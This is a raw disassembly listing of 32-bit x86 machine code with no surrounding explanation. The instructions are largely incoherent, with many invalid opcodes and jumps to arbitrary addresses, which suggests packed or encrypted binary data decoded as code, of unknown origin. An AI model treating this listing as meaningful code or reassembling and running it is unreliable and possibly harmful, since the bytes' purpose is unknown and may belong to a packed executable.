  40c1a3:	dec    ebx
  40c1a4:	push   es
  40c1a5:	add    eax,DWORD PTR [ecx+ecx*2]
  40c1a8:	icebp  
  40c1a9:	or     DWORD PTR [ebp+0x31],eax
  40c1ac:	mov    cl,0x8a
  40c1ae:	sub    BYTE PTR [ecx],dh
  40c1b0:	or     DWORD PTR [ebx+eax*8+0x2f],esp
  40c1b4:	xchg   ecx,eax
  40c1b5:	jmp    FWORD PTR [eax+0x62000932]
  40c1bb:	popa   
  40c1bc:	mov    ebp,0x4529fb8a
  40c1c1:	clc    
  40c1c2:	mov    ecx,0x56fc346b
  40c1c7:	pop    esp
  40c1c8:	sbb    eax,0x878b2985
  40c1cd:	popf   
  40c1ce:	jmp    0xbcc3cb05
  40c1d3:	push   0xffffffbf
  40c1d5:	or     eax,0xfec0066d
  40c1da:	jmp    0xea150652
  40c1df:	xor    cl,BYTE PTR [ecx]
  40c1e1:	add    BYTE PTR [esi],ah
  40c1e3:	icebp  
  40c1e4:	loopne 0x40c1e5
  40c1e6:	call   0xa507cb1d
  40c1eb:	and    bh,0xff
  40c1ee:	call   0x2d858a25
  40c1f3:	xor    cl,BYTE PTR [ecx]
  40c1f5:	add    cl,ch
  40c1f7:	mov    bh,0x54
  40c1f9:	clc    
  40c1fa:	bound  esp,QWORD PTR [esi+ecx*4]
  40c1fd:	inc    esp
  40c1fe:	mov    ch,0x5d
  40c200:	mov    WORD PTR [ecx+edi*4+0x65],es
  40c204:	xor    eax,DWORD PTR [ecx]
  40c206:	(bad)  
  40c207:	add    BYTE PTR [esi-0x3f],ah
  40c20a:	(bad)  
  40c20b:	cmp    ecx,DWORD PTR [ecx]
  40c20d:	adc    al,0xc0
  40c20f:	cmp    al,0x41
  40c211:	mov    bh,BYTE PTR [ebp+ebp*4+0x32]
  40c215:	xor    al,0x4e
  40c217:	push   0x6e
  40c219:	aad    0xff
  40c21b:	xor    al,0x73
  40c21d:	xor    DWORD PTR [eax+0xa],ebx
  40c220:	jb     0x40c22b
  40c222:	call   DWORD PTR [ecx+eiz*4]
  40c225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c226:	out    dx,al
  40c227:	xor    al,0x2d
  40c229:	or     DWORD PTR [ebx],ecx
  40c22b:	test   eax,0x661361
  40c230:	xchg   edi,eax
  40c231:	add    eax,0xfe410000
  40c236:	(bad)  
  40c237:	jmp    0x40c200
  40c239:	leave  
  40c23a:	inc    ebx
  40c23b:	enter  0xa98,0x0
  40c23f:	add    BYTE PTR [edi],cl
  40c241:	dec    esi
  40c242:	enter  0x85ff,0x6e
  40c246:	std    
  40c247:	jne    0x40c1d9
  40c249:	loop   0x40c22f
  40c24b:	std    
  40c24c:	dec    edi
  40c24e:	std    
  40c24f:	jne    0x40c275
  40c251:	fnstsw WORD PTR [eax]
  40c253:	pop    ebp
  40c254:	mov    BYTE PTR [edx],cl
  40c256:	cmp    DWORD PTR [ebp+0x20],0x5
  40c25a:	je     0x40c264
  40c25c:	pop    ds
  40c25d:	dec    esi
  40c25e:	fsubr  st,st(0)
  40c260:	jl     0x40c249
  40c262:	(bad)  
  40c263:	inc    DWORD PTR [ebx+0x41]
  40c266:	mov    dl,BYTE PTR [ebp+0x40]
  40c269:	cmp    al,0x11
  40c26b:	inc    DWORD PTR [eax]
  40c26d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c26e:	sar    ch,cl
  40c270:	push   edx
  40c271:	inc    eax
  40c272:	cmp    eax,0xb6c3fc54
  40c277:	std    
  40c278:	jne    0x40c2b6
  40c27a:	rcl    DWORD PTR [eax+0x8],1
  40c27d:	push   ecx
  40c27e:	mov    DWORD PTR [edx],0xeb3c6500
  40c284:	adc    esp,0xffffffa9
  40c287:	push   esp
  40c288:	cmp    DWORD PTR ds:0x18416231,0xa
  40c28f:	jne    0x40c2af
  40c291:	xlat   BYTE PTR ds:[ebx]
  40c292:	mov    esi,0x549639a
  40c297:	add    DWORD PTR [eax],eax
  40c299:	or     BYTE PTR [edx],cl
  40c29b:	mov    esi,0x4a7ba0
  40c2a0:	jmp    0x40c279
  40c2a2:	daa    
  40c2a3:	shl    DWORD PTR [esi],0xca
  40c2a6:	test   ah,al
  40c2a8:	add    dh,BYTE PTR [ecx]
  40c2aa:	push   cs
  40c2ab:	test   DWORD PTR ds:0x82d51531,edi
  40c2b1:	add    al,0x8
  40c2b3:	cmp    eax,0xf7b03141
  40c2b8:	cmp    DWORD PTR [edx-0x4dfffd51],0x6c
  40c2bf:	dec    esi
  40c2c0:	dec    ebx
  40c2c1:	lock scas eax,DWORD PTR es:[edi]
  40c2c3:	add    cl,BYTE PTR [edi]
  40c2c5:	mov    ch,0x4d
  40c2c7:	add    eax,DWORD PTR [eax]
  40c2c9:	xor    DWORD PTR [ebx],esi
  40c2cb:	push   es
  40c2cc:	lods   al,BYTE PTR ds:[esi]
  40c2cd:	cli    
  40c2ce:	jo     0x40c2d2
  40c2d0:	add    BYTE PTR [eax],al
  40c2d2:	ss sub al,0xe2
  40c2d5:	(bad)  
  40c2d6:	jle    0x40c287
  40c2d8:	mov    edi,0x2af7544
  40c2dd:	add    BYTE PTR [ecx],dh
  40c2df:	out    0x3d,eax
  40c2e1:	clc    
  40c2e2:	xor    DWORD PTR [eax+0x64ac0002],esi
  40c2e8:	(bad)  
  40c2e9:	dec    edi
  40c2ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2eb:	ins    BYTE PTR es:[edi],dx
  40c2ec:	retf   0xdb4f
  40c2ef:	scas   eax,DWORD PTR es:[edi]
  40c2f0:	pop    edx
  40c2f1:	jmp    0x3424:0xff0270d2
  40c2f8:	cmp    al,0x41
  40c2fa:	xor    DWORD PTR [ebx-0xb4af13e],ebp
  40c300:	add    al,BYTE PTR [eax]
  40c302:	xor    DWORD PTR [edi],ebp
  40c304:	dec    ecx
  40c305:	clc    
  40c306:	xor    DWORD PTR [ebx-0x4dce5482],ebp
  40c30c:	add    al,BYTE PTR [ebx+0xf03ce8c]
  40c312:	lods   eax,DWORD PTR ds:[esi]
  40c313:	nop
  40c314:	add    eax,DWORD PTR [eax]
  40c316:	xor    DWORD PTR [edi],esi
  40c318:	push   ecx
  40c319:	cld    
  40c31a:	or     BYTE PTR [ecx],dh
  40c31c:	add    al,0x0
  40c31e:	xor    DWORD PTR [ebx+edi*2],edx
  40c321:	xor    eax,0xec1f09e6
  40c326:	scas   eax,DWORD PTR es:[edi]
  40c327:	inc    esi
  40c328:	cdq    
  40c329:	(bad)  
  40c32a:	pop    esp
  40c32b:	sbb    eax,0x31c54166
  40c330:	dec    ecx
  40c331:	arpl   WORD PTR [eax+0x9],si
  40c334:	xchg   ecx,eax
  40c335:	in     eax,dx
  40c336:	add    BYTE PTR [edx+0x9],bl
  40c339:	jmp    0xa8c999f2
  40c33e:	add    bh,BYTE PTR [eax-0x2ea376ba]
  40c344:	sub    BYTE PTR [eax+0x4546ae03],ch
  40c34a:	mov    edi,0x3e8aced
  40c34f:	xor    DWORD PTR [ecx],ecx
  40c351:	pop    esp
  40c352:	inc    ecx
  40c353:	cdq    
  40c354:	pop    ecx
  40c355:	rol    DWORD PTR [ebx+ecx*1],cl
  40c358:	or     ebx,edx
  40c35a:	add    esp,DWORD PTR [esi+eax*2+0x8db3449]
  40c361:	pop    esp
  40c362:	inc    ecx
  40c363:	popa   
  40c364:	pop    ecx
  40c365:	es icebp 
  40c367:	mov    dl,BYTE PTR [eax-0x58]
  40c36a:	add    ebp,DWORD PTR [edx]
  40c36c:	leave  
  40c36d:	pushf  
  40c36e:	sbb    BYTE PTR [edx-0x42fc02c2],dh
  40c374:	jecxz  0x40c3b6
  40c376:	add    eax,0xfae90931
  40c37b:	jbe    0x40c3b2
  40c37d:	ffreep st(6)
  40c37f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c380:	adc    esi,ebp
  40c382:	push   eax
  40c383:	sbb    DWORD PTR [ebx+ebx*2-0xecce028],edi
  40c38a:	pop    ebx
  40c38b:	sub    eax,0x1685c609
  40c390:	jbe    0x40c364
  40c392:	mov    BYTE PTR [edi],0xbc
  40c395:	cmp    ebx,eax
  40c397:	push   ss
  40c398:	loop   0x40c3bc
  40c39a:	add    al,0x0
  40c39c:	xor    DWORD PTR [ebx+0x0],ebx
  40c39f:	mov    dh,0x29
  40c3a1:	rol    DWORD PTR [edx+0x7c86e6a7],0xa1
  40c3a8:	xor    dh,BYTE PTR ds:0x92c6a09
  40c3ae:	(bad)  
  40c3b0:	addr16 mov esp,0x34ef8efe
  40c3b6:	cld    
  40c3b7:	xchg   cl,al
  40c3b9:	xor    ecx,DWORD PTR [ebx+0x28]
  40c3bc:	sub    eax,0xaeabc95b
  40c3c1:	mov    ebx,0x867e6253
  40c3c6:	ret    
  40c3c7:	popa   
  40c3c8:	clc    
  40c3c9:	or     BYTE PTR [edx+0xe],ch
  40c3cc:	outs   dx,BYTE PTR ds:[esi]
  40c3cd:	xor    al,0x8
  40c3cf:	inc    ecx
  40c3d0:	arpl   WORD PTR [edi],bp
  40c3d2:	dec    DWORD PTR [esi+0x5]
  40c3d5:	inc    ebp
  40c3d6:	cld    
  40c3d7:	push   0x29
  40c3d9:	lds    ecx,FWORD PTR [edx-0x58]
  40c3dc:	xor    cl,BYTE PTR [ecx]
  40c3de:	je     0x40c3d6
  40c3e0:	scas   eax,DWORD PTR es:[edi]
  40c3e1:	inc    esp
  40c3e2:	clc    
  40c3e3:	jmp    0xd240cd1a
  40c3e8:	jb     0x40c435
  40c3ea:	push   eax
  40c3eb:	mov    ecx,0xbbf854d9
  40c3f0:	ja     0x40c406
  40c3f2:	les    esp,FWORD PTR [edx+0x298508ed]
  40c3f8:	in     eax,dx
  40c3f9:	push   es
  40c3fa:	jmp    0x40c3c6
  40c3fc:	mov    bl,0x3c
  40c3fe:	clc    
  40c3ff:	jmp    0xeb484504
  40c404:	ror    BYTE PTR [edx+0x3529a298],cl
  40c40a:	mov    edx,0x35ece174
  40c40f:	or     cl,al
  40c411:	pusha  
  40c412:	sar    dh,0xce
  40c415:	mov    BYTE PTR [ebp-0x8],dl
  40c418:	add    BYTE PTR [ebx-0xf8a0249],al
  40c41e:	les    edx,FWORD PTR [eax+0x8]
  40c421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c422:	dec    edx
  40c423:	or     al,ch
  40c425:	pop    ds
  40c426:	ret    0xfffd
  40c429:	xchg   edi,eax
  40c42a:	dec    edx
  40c42b:	or     al,ch
  40c42d:	jo     0x40c3f2
  40c42f:	std    
  40c430:	jmp    DWORD PTR [edi+0x1dfffc4a]
  40c436:	mov    ebp,0xc424d3e6
  40c43b:	std    
  40c43c:	leave  
  40c43d:	mov    cl,BYTE PTR [ecx]
  40c43f:	add    BYTE PTR [ebp+0x13],dl
  40c442:	loope  0x40c3c5
  40c444:	les    ebp,FWORD PTR [eax]
  40c446:	jmp    0x40c49e
  40c448:	push   ebx
  40c449:	and    ebp,edx
  40c44b:	or     eax,edi
  40c44d:	mov    al,BYTE PTR [esi]
  40c44f:	add    BYTE PTR [eax],al
  40c451:	cwde   
  40c452:	lds    esi,FWORD PTR [ebx+0x8]
  40c455:	lock mov cl,0x58
  40c458:	add    BYTE PTR [eax-0x40fe0977],cl
  40c45e:	mov    edi,0xe5c3c029
  40c463:	pop    ebp
  40c464:	leave  
  40c465:	add    BYTE PTR [edx],bl
  40c467:	mov    ebp,0x4040d0fe
  40c46c:	push   esp
  40c46d:	or     al,0xe1
  40c46f:	push   es
  40c470:	mov    ebx,eax
  40c472:	push   edi
  40c473:	mov    al,bl
  40c475:	add    BYTE PTR [eax+0x6],bl
  40c478:	mov    esi,DWORD PTR [ebp+0x40]
  40c47b:	inc    ecx
  40c47c:	jl     0x40c486
  40c47e:	and    ebp,edi
  40c480:	mov    ebx,DWORD PTR gs:[esi]
  40c483:	xchg   dl,bh
  40c485:	xor    BYTE PTR [edx+0x51fc7ec0],ch
  40c48b:	dec    esp
  40c48c:	add    eax,0xeb15e480
  40c491:	sbb    esi,DWORD PTR [ecx]
  40c493:	xor    bh,al
  40c495:	inc    eax
  40c496:	sbb    ebp,0xffffff82
  40c499:	sti    
  40c49a:	ja     0x40c497
  40c49c:	sti    
  40c49d:	jg     0x40c4a4
  40c49f:	icebp  
  40c4a0:	add    ebx,0x3b
  40c4a3:	(bad)  
  40c4a4:	stc    
  40c4a5:	sub    dh,cl
  40c4a7:	push   ss
  40c4a8:	and    eax,0xfa6de85e
  40c4ad:	call   FWORD PTR [edx]
  40c4af:	loopne 0x40c501
  40c4b1:	or     BYTE PTR ds:0x15044bd9,cl
  40c4b7:	loopne 0x40c490
  40c4b9:	push   ss
  40c4ba:	std    
  40c4bb:	lock push ecx
  40c4bd:	or     dh,ch
  40c4bf:	loope  0x40c50d
  40c4c1:	push   es
  40c4c2:	pop    ebp
  40c4c3:	icebp  
  40c4c4:	dec    DWORD PTR [ecx]
  40c4c6:	call   0xc2fa:0xc017a8
  40c4cd:	and    al,0xc9
  40c4cf:	jae    0x40c488
  40c4d1:	add    al,al
  40c4d3:	xchg   ecx,eax
  40c4d4:	stos   DWORD PTR es:[edi],eax
  40c4d5:	clc    
  40c4d6:	ret    
  40c4d7:	(bad)  [esi+0x7f]
  40c4da:	lds    esi,FWORD PTR [ebx]
  40c4dc:	mov    bh,0xa7
  40c4de:	je     0x40c4b3
  40c4e0:	ss ds or al,0x6e
  40c4e4:	mov    edi,0xea694473
  40c4e9:	dec    ebp
  40c4ea:	or     BYTE PTR [esi-0x13393994],ch
  40c4f0:	adc    eax,DWORD PTR [ebx]
  40c4f2:	add    BYTE PTR [ecx],dh
  40c4f4:	mov    al,0x7f
  40c4f6:	cmp    al,0x95
  40c4f8:	inc    cx
  40c4fa:	add    BYTE PTR [ecx],dh
  40c4fc:	cmp    al,0x2d
  40c4fe:	(bad)  
  40c4ff:	in     al,dx
  40c500:	mov    edi,0x8c306a31
  40c505:	add    ch,BYTE PTR [edx+0x31]
  40c508:	mov    WORD PTR [edx],es
  40c50a:	push   0x31
  40c50c:	or     DWORD PTR [ecx+ecx*2+0x19],esi
  40c510:	pop    edx
  40c511:	ficomp WORD PTR [ecx]
  40c513:	fld    QWORD PTR [eax+ebp*1+0x4]
  40c517:	cmp    cl,cl
  40c519:	push   esp
  40c51a:	(bad)  
  40c51b:	mov    bl,0x36
  40c51d:	mov    ebp,0x71fd7d04
  40c522:	dec    ecx
  40c523:	cmp    eax,0x2bb42384
  40c528:	add    DWORD PTR [esi],esi
  40c52a:	out    dx,al
  40c52b:	fiadd  DWORD PTR [ebx+ebx*1+0x36ab00b8]
  40c532:	icebp  
  40c533:	mov    ?,WORD PTR [ebp-0x47]
  40c536:	mov    DWORD PTR [esi],eax
  40c538:	ret    0x616d
  40c53b:	dec    ecx
  40c53c:	sub    eax,0xa7b3fbb8
  40c541:	or     DWORD PTR [esi+0x39],edi
  40c544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c545:	mov    eax,ds:0x9315cbc
  40c54a:	xor    DWORD PTR ds:0x5ee90931,eax
  40c550:	not    BYTE PTR [esi+0x30]
  40c553:	(bad)  
  40c554:	or     DWORD PTR ss:[edx],eax
  40c557:	(bad)  
  40c558:	jmp    0x40c5b1
  40c55a:	scas   eax,DWORD PTR es:[edi]
  40c55b:	int3   
  40c55c:	jo     0x40c55f
  40c55e:	jmp    0x69e66fbb
  40c563:	enter  0x21ae,0xe9
  40c567:	jecxz  0x40c5cf
  40c569:	mov    eax,0xb7cf0240
  40c56e:	and    eax,0x90b4ed8d
  40c573:	add    edx,DWORD PTR [ecx]
  40c575:	or     ecx,ebp
  40c577:	stos   DWORD PTR es:[edi],eax
  40c578:	add    DWORD PTR [edi],esp
  40c57a:	push   cs
  40c57b:	ret    
  40c57c:	test   eax,0x312c014e
  40c581:	jmp    0xed59c96e
  40c586:	inc    DWORD PTR [esi-0x5b77490d]
  40c58c:	out    0x2f,al
  40c58e:	add    BYTE PTR [ecx],cl
  40c590:	sub    eax,0xf6e809
  40c595:	inc    eax
  40c596:	mov    eax,0xb97960fe
  40c59b:	addr16 jmp 0xd23f7db3
  40c5a1:	and    al,0x27
  40c5a3:	(bad)  
  40c5a4:	mov    esi,0x41ec4cbd
  40c5a9:	sub    eax,0x8ae8ffe9
  40c5ae:	mov    ah,0x6c
  40c5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5b1:	repz add BYTE PTR [ecx+edx*4+0x1a],0x9
  40c5b7:	and    cl,ch
  40c5b9:	xor    ah,BYTE PTR [ecx-0x490c0311]
  40c5bf:	mov    BYTE PTR [ecx+ecx*4],ch
  40c5c2:	mov    dh,0x74
  40c5c4:	fstp   DWORD PTR [edx-0x10]
  40c5c7:	arpl   WORD PTR [eax],bp
  40c5c9:	sub    eax,0xca6d74b8
  40c5ce:	xlat   BYTE PTR ds:[ebx]
  40c5cf:	pop    eax
  40c5d0:	jmp    0xee045207
  40c5d5:	jae    0x40c613
  40c5d7:	adc    cl,al
  40c5d9:	test   BYTE PTR [ebx],ch
  40c5db:	inc    ecx
  40c5dc:	jmp    0x52390254
  40c5e1:	popa   
  40c5e2:	push   eax
  40c5e3:	add    cl,ch
  40c5e5:	mov    bh,0xcb
  40c5e7:	or     esi,DWORD PTR [esi]
  40c5e9:	sub    DWORD PTR [ecx],ebx
  40c5eb:	push   0x4a169e
  40c5f0:	sbb    DWORD PTR es:[ebp+0x8ed63e7],edi
  40c5f7:	add    BYTE PTR [edx+0x0],ch
  40c5fa:	outs   dx,BYTE PTR ds:[esi]
  40c5fb:	add    edi,edi
  40c5fd:	xchg   esp,eax
  40c5fe:	and    ah,BYTE PTR [ecx]
  40c600:	outs   dx,BYTE PTR ds:[esi]
  40c601:	add    BYTE PTR [esp+ecx*2+0x7aa5ff00],ah
  40c608:	out    0xa7,al
  40c60a:	ror    DWORD PTR [edx],0x0
  40c60d:	adc    DWORD PTR [esi+eax*1-0x1],0x75
  40c612:	sbb    bl,ah
  40c614:	and    BYTE PTR [ecx+ebx*2+0xd],0xff
  40c619:	jne    0x40c607
  40c61b:	gs xchg edx,eax
  40c61d:	pop    ecx
  40c61e:	or     BYTE PTR [ebx],cl
  40c620:	add    esp,0xfffffffc
  40c623:	leave  
  40c624:	jae    0x40c632
  40c626:	adc    BYTE PTR [eax-0x3627be9e],0x73
  40c62d:	call   0x985122
  40c632:	enter  0xc28d,0xc
  40c636:	scas   eax,DWORD PTR es:[edi]
  40c637:	dec    BYTE PTR [edi]
  40c639:	push   0x40e17b
  40c63e:	scas   eax,DWORD PTR es:[edi]
  40c63f:	(bad)  
  40c640:	jecxz  0x40c62a
  40c642:	push   ds
  40c643:	push   edx
  40c644:	add    BYTE PTR [eax],al
  40c646:	sbb    eax,ecx
  40c648:	or     ch,BYTE PTR [edx-0x68]
  40c64b:	leave  
  40c64c:	jae    0x40c64a
  40c64e:	paddd  mm1,QWORD PTR [ebx]
  40c651:	push   DWORD PTR ds:0x984146df
  40c657:	bound  edx,QWORD PTR [eax+esi*2-0x21]
  40c65b:	mov    DWORD PTR [edi-0x1917ffbb],0x72b5feff
  40c665:	std    
  40c666:	jne    0x40c6c4
  40c668:	leave  
  40c669:	xor    edx,edx
  40c66b:	nop
  40c66c:	dec    ebx
  40c66d:	add    al,ch
  40c66f:	mov    dl,bh
  40c671:	(bad)  
  40c672:	jmp    ecx
  40c674:	dec    ebp
  40c675:	fsubr  QWORD PTR [edx+0x58]
  40c678:	leave  
  40c679:	jae    0x40c66f
  40c67b:	xor    DWORD PTR [edi],ebx
  40c67d:	aaa    
  40c67e:	or     al,0x3e
  40c680:	fst    st(4)
  40c682:	inc    edi
  40c683:	lock lahf 
  40c685:	stos   BYTE PTR es:[edi],al
  40c686:	sub    DWORD PTR [ecx+0x6c88bfb7],esp
  40c68c:	sbb    BYTE PTR [esi],ch
  40c68e:	add    BYTE PTR [esi],bl
  40c690:	cmp    eax,0xd89cfeb3
  40c695:	mov    edi,0x42f7e334
  40c69a:	add    BYTE PTR [ecx],bl
  40c69c:	mov    ah,0x32
  40c69e:	(bad)  
  40c69f:	(bad)  
  40c6a0:	sub    BYTE PTR [esi-0x2c],al
  40c6a3:	mov    esp,DWORD PTR [eax+0x76dd74bf]
  40c6a9:	xor    eax,0xd4b4e6e8
  40c6ae:	inc    edi
  40c6af:	jo     0x40c651
  40c6b1:	stos   BYTE PTR es:[edi],al
  40c6b2:	std    
  40c6b3:	inc    esi
  40c6b4:	outs   dx,DWORD PTR ds:[esi]
  40c6b5:	mov    edi,0x8d707488
  40c6ba:	inc    esp
  40c6bb:	icebp  
  40c6bc:	out    dx,eax
  40c6bd:	shl    BYTE PTR [ebp+edx*8-0x7a],0x35
  40c6c2:	or     al,0x0
  40c6c4:	mov    dh,0x74
  40c6c6:	aam    0x47
  40c6c8:	lock lahf 
  40c6ca:	stos   BYTE PTR es:[edi],al
  40c6cb:	in     eax,0x16
  40c6cd:	aas    
  40c6ce:	ror    BYTE PTR [eax+0x7c8393f4],0x91
  40c6d5:	lahf   
  40c6d6:	je     0x4366a2
  40c6dc:	mov    dl,0xdc
  40c6de:	(bad)  
  40c6df:	jmp    FWORD PTR [edi]
  40c6e1:	sub    al,0x6e
  40c6e3:	push   DWORD PTR [esi-0x61]
  40c6e6:	cmp    DWORD PTR [ecx+eax*4-0x61],0xf
  40c6eb:	test   BYTE PTR [edx-0x53fffd61],dl
  40c6f1:	ins    BYTE PTR es:[edi],dx
  40c6f2:	(bad)  
  40c6f3:	dec    edi
  40c6f4:	push   esi
  40c6f5:	or     BYTE PTR [edi+edx*8-0x3fe3a7aa],bl
  40c6fc:	inc    edi
  40c6fd:	add    DWORD PTR [ecx],ebp
  40c6ff:	adc    BYTE PTR [ebp+0x3103e885],dh
  40c705:	mov    al,BYTE PTR [ebx+0x65042ec7]
  40c70b:	xchg   BYTE PTR [esi],ah
  40c70d:	mov    ch,0xe8
  40c70f:	mov    ?,WORD PTR [ebp-0x3f]
  40c712:	cwde   
  40c713:	rcr    BYTE PTR [ebp+0xdf2d0d9],0xb5
  40c71a:	fisttp QWORD PTR [ebx]
  40c71c:	icebp  
  40c71d:	cmp    eax,0xc17d835c
  40c722:	call   0xd9624d5e
  40c727:	add    eax,DWORD PTR [eax]
  40c729:	fidiv  WORD PTR [ebx-0x43]
  40c72c:	cmp    DWORD PTR [ecx],edi
  40c72e:	mov    eax,ds:0xb4de2cd3
  40c733:	lods   eax,DWORD PTR ds:[esi]
  40c734:	cmp    ecx,edx
  40c736:	mov    ah,0x1b
  40c738:	or     al,0xd9
  40c73a:	cmp    eax,0xb4c7bf10
  40c73f:	sbb    esp,eax
  40c741:	mov    edi,0x49abe13e
  40c746:	and    al,BYTE PTR [esi-0x5ec15041]
  40c74c:	mov    edi,0x5e81011d
  40c751:	or     BYTE PTR [ebp+ebp*2+0x65cd1dbf],dh
  40c758:	cmp    DWORD PTR [ebp-0x4c],esp
  40c75b:	ror    DWORD PTR [ebx],cl
  40c75d:	cdq    
  40c75e:	in     eax,dx
  40c75f:	mov    edi,0xd3b47fbe
  40c764:	retf   
  40c765:	ja     0x40c7a5
  40c767:	sbb    DWORD PTR [edi+0x165100e5],edi
  40c76d:	fdiv   DWORD PTR [ebx+0x35b235ff]
  40c773:	int3   
  40c774:	jmp    0xa4c3e597
  40c779:	jb     0x40c783
  40c77b:	jne    0x40c76b
  40c77d:	mov    ebx,0x4516cc4d
  40c782:	mov    bl,0x74
  40c784:	loope  0x40c710
  40c786:	retf   
  40c787:	addr16 push es
  40c789:	out    dx,al
  40c78a:	sahf   
  40c78b:	or     DWORD PTR [ebx+0x74b43200],edx
  40c791:	loope  0x40c75d
  40c793:	outs   dx,BYTE PTR ds:[esi]
  40c794:	addr16 out dx,al
  40c796:	xlat   BYTE PTR ds:[ebx]
  40c797:	mov    dl,0x74
  40c799:	in     eax,0xda
  40c79b:	or     DWORD PTR [esi+ebx*8-0x39],ebp
  40c79f:	mov    dl,0x74
  40c7a1:	ror    edx,1
  40c7a3:	mov    cl,0x6a
  40c7a5:	into   
  40c7a6:	mov    bh,0xb2
  40c7a8:	je     0x40c767
  40c7aa:	call   0x74b2:0xa7be6ab9
  40c7b1:	mov    ecx,0xae6aa18a
  40c7b6:	xchg   edi,eax
  40c7b7:	mov    dl,0x74
  40c7b9:	xchg   ebp,eax
  40c7ba:	call   0x74b2:0x879e6aa9
  40c7c1:	or     DWORD PTR [edx+0x778e6ad1],0xda8d74b2
  40c7cb:	fldcw  WORD PTR [edx+0x7e]
  40c7ce:	out    0xb2,eax
  40c7d0:	je     0x40c75b
  40c7d2:	retf   0x6ac1
  40c7d5:	outs   dx,BYTE PTR ds:[esi]
  40c7d6:	xlat   BYTE PTR ds:[ebx]
  40c7d7:	mov    dl,0x74
  40c7d9:	inc    ebp
  40c7da:	fcmove st,st(1)
  40c7dc:	push   0x5e
  40c7de:	(bad)  
  40c7df:	mov    dl,0x74
  40c7e1:	xor    edx,ecx
  40c7e3:	jno    0x40c84f
  40c7e5:	dec    esi
  40c7e6:	mov    bh,0xb2
  40c7e8:	je     0x40c7ea
  40c7ea:	dec    esp
  40c7eb:	pusha  
  40c7ec:	mov    al,0x6b
  40c7ee:	daa    
  40c7ef:	jae    0x40c7ee
  40c7f1:	jne    0x40c7f3
  40c7f3:	cmp    BYTE PTR [eax-0x58],ah
  40c7f6:	imul   eax,DWORD PTR [edi],0x73
  40c7f9:	std    
  40c7fa:	jne    0x40c800
  40c7fc:	pusha  
  40c7fd:	mov    al,ds:0xc773276b
  40c802:	ret    0x754
  40c805:	push   ebp
  40c806:	mov    esi,DWORD PTR [edi+eax*4]
  40c809:	ret    0x2fe8
  40c80c:	jne    0x40c80b
  40c80e:	(bad)  
  40c80f:	int    0x72
  40c811:	dec    esi
  40c812:	call   FWORD PTR [ebp+0x3a35ff02]
  40c818:	ds inc ecx
  40c81a:	add    al,ah
  40c81c:	cmp    dl,BYTE PTR [esi+0x0]
  40c81f:	sbb    BYTE PTR [edx],al
  40c821:	ror    BYTE PTR [edi],0x8d
  40c824:	adc    DWORD PTR [ecx],eax
  40c826:	add    BYTE PTR [eax],cl
  40c828:	into   
  40c829:	inc    ebx
  40c82a:	clc    
  40c82b:	fadd   DWORD PTR [esi]
  40c82d:	add    BYTE PTR [eax],al
  40c82f:	(bad)
  40c833:	iret   
  40c834:	push   es
  40c835:	add    BYTE PTR [edx-0x38],ch
  40c838:	loopne 0x40c839
  40c83a:	imul   ebx,eax,0xd8cffe0
  40c840:	jno    0x40c890
  40c842:	lea    ecx,[ebp+0x7d]
  40c845:	cmc    
  40c846:	jmp    DWORD PTR [edi-0x4f8a00a3]
  40c84c:	je     0x40c8c1
  40c84e:	cld    
  40c84f:	ror    BYTE PTR [ebp+edx*2-0x3ffe7800],0x74
  40c857:	add    BYTE PTR [ebp-0x67ff2aa1],cl
  40c85d:	push   es
  40c85e:	push   0x47c0ae
  40c863:	push   DWORD PTR [ecx]
  40c865:	aad    0xe
  40c867:	call   0xfefc3ac5
  40c86c:	add    DWORD PTR [edi],esi
  40c86e:	aam    0x8c
  40c870:	lods   al,BYTE PTR ds:[esi]
  40c871:	lock mov ah,0xfe
  40c874:	pop    esi
  40c875:	nop
  40c876:	push   eax
  40c877:	call   0xfefc3ae5
  40c87c:	mov    eax,0x46f6ac25
  40c881:	adc    ebp,DWORD PTR [ebp+ebx*1-0x7342e536]
  40c888:	in     al,dx
  40c889:	andps  xmm5,XMMWORD PTR [eax+0x4a]
  40c88d:	test   BYTE PTR [ecx+0x0],al
  40c890:	es std 
  40c892:	stos   DWORD PTR es:[edi],eax
  40c893:	neg    BYTE PTR [esi]
  40c895:	mov    ebx,0x680334bb
  40c89a:	inc    ecx
  40c89b:	add    BYTE PTR [ecx],bl
  40c89d:	or     al,0x2e
  40c89f:	inc    DWORD PTR [esi]
  40c8a1:	cmp    DWORD PTR [esi-0x4424f915],eax
  40c8a7:	xor    BYTE PTR [ebx+esi*2-0x6011014d],0x36
  40c8af:	pop    edx
  40c8b0:	mov    dl,0xf4
  40c8b2:	mov    bl,0x3
  40c8b4:	fs jmp 0x7b064d42
  40c8ba:	mov    ebx,0xcfce00fe
  40c8bf:	mov    eax,DWORD PTR [ebp+edx*8-0x4f014466]
  40c8c6:	pop    esp
  40c8c7:	scas   eax,DWORD PTR es:[edi]
  40c8c8:	div    BYTE PTR [esi+0x3102aa82]
  40c8ce:	mov    al,ds:0x2c6e0a34
  40c8d3:	scas   eax,DWORD PTR es:[edi]
  40c8d4:	neg    BYTE PTR [esi+0x3102ab3a]
  40c8da:	mov    al,ds:0x88e19a7
  40c8df:	je     0x40c890
  40c8e1:	jg     0x40c894
  40c8e3:	pop    ebp
  40c8e4:	mov    esp,0xbc5da4c5
  40c8e9:	ja     0x40c89c
  40c8eb:	xchg   ebx,eax
  40c8ec:	stos   DWORD PTR es:[edi],eax
  40c8ed:	addr16 mov cl,0x45
  40c8f0:	mov    esp,0x3b5100dd
  40c8f5:	pop    ebp
  40c8f6:	mov    cl,0x35
  40c8f8:	adc    BYTE PTR [ebp+0x4fbc35a4],0x8
  40c8ff:	pushf  
  40c900:	fiadd  WORD PTR [edi+0x7b]
  40c903:	or     al,0xb4
  40c905:	aas    
  40c906:	mov    cl,0x0
  40c908:	cwde   
  40c909:	enter  0xdb1,0xbc
  40c90d:	in     eax,0x9d
  40c90f:	std    
  40c910:	mov    ebx,0x2958a227
  40c915:	push   ds
  40c916:	mov    cl,0xf5
  40c918:	jne    0x40c928
  40c91a:	mov    ecx,0x370fbbed
  40c91f:	icebp  
  40c920:	stos   DWORD PTR es:[edi],eax
